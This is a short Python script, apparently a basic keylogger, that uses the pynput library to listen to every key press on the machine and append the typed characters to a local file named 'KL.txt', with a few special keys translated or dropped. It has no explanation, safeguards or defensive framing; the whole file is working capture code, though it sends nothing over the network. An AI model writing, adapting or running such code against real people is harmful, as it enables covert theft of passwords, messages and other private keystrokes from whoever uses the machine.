from pynput.keyboard import Key, Listener

def insert_to_file(key):
    alpha=str(key)
    letter=alpha.replace("'","")
    if letter == 'Key.space':
        letter = ' '
    elif letter == 'Key.shift_r' or letter == 'Key.shift_l':
        letter = ''
    elif letter == "Key.ctrl_l" or letter == 'Key.shift_l':
        letter = ""
    elif letter == "Key.enter":
        letter = "\n"
    elif letter == "Key.esc":
        return


    with open("KL.txt",'a') as f:
        f.write(letter)

with Listener(
        on_press=insert_to_file) as listener:
    listener.join()
